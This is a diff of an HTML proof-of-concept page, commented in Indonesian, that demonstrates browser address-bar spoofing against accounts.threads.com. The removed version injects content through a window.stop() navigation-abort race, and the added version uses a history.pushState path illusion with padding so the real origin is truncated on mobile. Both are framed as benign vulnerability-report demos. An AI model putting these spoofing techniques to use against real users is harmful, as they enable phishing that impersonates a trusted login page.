@@ -1,48 +1,38 @@
 <!DOCTYPE html>
-<!-- SPOOF PoC #2 — MECHANISM: NAVIGATION-ABORT RACE (window.stop during commit)
-     Fix-point: bilah alamat commit URL target lalu load di-STOP sebelum dokumen cross-origin
-     mengambil alih; initial-empty-document (masih same-origin dgn opener) diisi konten palsu.
-     BEDA dari #2-mu (hanging-port google.com:82 + setInterval document.write): di sini pemicunya
-     window.stop(), bukan port yang menggantung. Benign PoC. -->
+<!-- SPOOF PoC #3 — MECHANISM: history.pushState PATH ILLUSION + truncation padding
+     Fix-point: rendering PATH (bukan userinfo/authority) + pemotongan bilah alamat di mobile.
+     BEDA dari #1-mu (userinfo '@'): di sini tak ada '@', host asli sah, yang menipu = PATH panjang
+     yang diawali string mirip-host, lalu bagian kiri (origin asli) terdorong keluar layar mobile. -->
 <html lang="id"><head><meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1"><title>accounts.threads.com</title>
 <style>body{font-family:-apple-system,'Segoe UI',Roboto,Arial;margin:0;padding:28px;max-width:660px}
-h1{font-size:18px}code{background:#f6f8fa;padding:1px 5px;border-radius:4px}
+h1{font-size:18px}code{background:#f6f8fa;padding:1px 5px;border-radius:4px;word-break:break-all}
 .cmp{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:14px 0}
 .cmp div{border:1px solid #d0d7de;border-radius:8px;padding:10px;font-size:12px;word-break:break-all}
 .cmp b{display:block;font-size:11px;color:#57606a}.fake{color:#1a7f37}.real{color:#cf222e}
-label{font-size:13px;color:#57606a}input{width:100%;padding:8px;border:1px solid #d0d7de;border-radius:6px;font-size:13px;margin:4px 0 12px}
-button{cursor:pointer;font-size:14px;border:1px solid #1a73e8;background:#1a73e8;color:#fff;border-radius:8px;padding:10px 18px;font-weight:600}
+button{cursor:pointer;font-size:14px;border:1px solid #1a73e8;background:#1a73e8;color:#fff;border-radius:8px;padding:10px 18px;font-weight:600;margin:4px 6px 4px 0}
 .warn{background:#fff8c5;border:1px solid #d4a72c;border-radius:8px;padding:8px 12px;font-size:12px;color:#7a5c00;margin-top:12px}</style></head>
 <body>
-<h1>Spoof PoC #2 — Navigation-Abort Race (<code>window.stop()</code>)</h1>
-<p>Buka target asli → bilah alamat commit URL-nya → <code>stop()</code> membekukan load sebelum dokumen cross-origin masuk → initial-empty-document diisi konten palsu. Timing-sensitif: geser delay bila gagal.</p>
-<label>Target URL (yang mau tampil di bilah alamat)</label>
-<input id="target" value="https://accounts.threads.com/">
-<label>Delay stop (ms) — geser 120–600</label>
-<input id="delay" type="number" value="250">
+<h1>Spoof PoC #3 — pushState Path Illusion</h1>
+<p>Mengubah PATH yang ditampilkan bilah alamat tanpa navigasi. Di mobile, origin asli (kiri) terpotong; yang terlihat = string mirip-host di awal path.</p>
 <div class="cmp">
-  <div><b>DISPLAYED (palsu)</b><span class="fake" id="disp">https://accounts.threads.com/</span></div>
-  <div><b>REAL isi</b><span class="real">HTML dari origin-mu</span></div>
+  <div><b>DISPLAYED (setelah push)</b><span class="fake" id="disp"></span></div>
+  <div><b>REAL origin</b><span class="real" id="real"></span></div>
 </div>
-<button onclick="go()">▶ Jalankan race</button>
-<div class="warn">Vulnerable bila bilah alamat menahan URL target sementara isi popup = konten palsumu. Screenshot → STOP → lapor.</div>
+<button onclick="push(1)">▶ Push path mirip-host</button>
+<button onclick="push(2)">▶ Push + padding (mobile truncation)</button>
+<button onclick="history.back()">↩ Kembalikan</button>
+<div class="warn">Vulnerable bila di layar sempit bagian yang terbaca cuma <code>accounts.threads.com/...</code> dan origin aslimu tak terlihat. Screenshot → STOP → lapor.</div>
 <script>
-const t=document.getElementById('target');t.addEventListener('input',()=>document.getElementById('disp').textContent=t.value);
-function go(){
-  const url=t.value,delay=+document.getElementById('delay').value||250;
-  const w=window.open(url,'_blank','width=440,height=580');
-  if(!w){alert('Popup diblokir.');return;}
-  setTimeout(()=>{
-    try{
-      w.stop();                       // batalkan load; URL sudah commit di bilah alamat
-      w.document.title='accounts.threads.com';
-      w.document.body.innerHTML=`
-        <div style="font-family:system-ui;padding:22px">
-          <h3 style="font-weight:500;color:#5f6368">Load dihentikan — konten ini milik origin penyerang</h3>
-          <p style="color:#b00020;font-weight:600">POC spoofing — bukan Threads asli.</p>
-          <p style="color:#5f6368;font-size:13px">Bilah alamat seharusnya masih menampilkan ${url}</p></div>`;
-    }catch(e){ /* keburu cross-origin commit -> kecilkan delay */ }
-  },delay);
+document.getElementById('real').textContent=location.origin;
+function push(mode){
+  let path;
+  if(mode===1){ path='/accounts.threads.com/login/verify?session=continue'; }
+  else{ // padding: dorong origin asli keluar layar via segmen panjang
+    const pad='⁄'.repeat(0)+'-'.repeat(90);
+    path='/'+pad+'/accounts.threads.com/login/verify';
+  }
+  history.pushState({},'',path);
+  document.getElementById('disp').textContent=location.href;
 }
 </script></body></html>
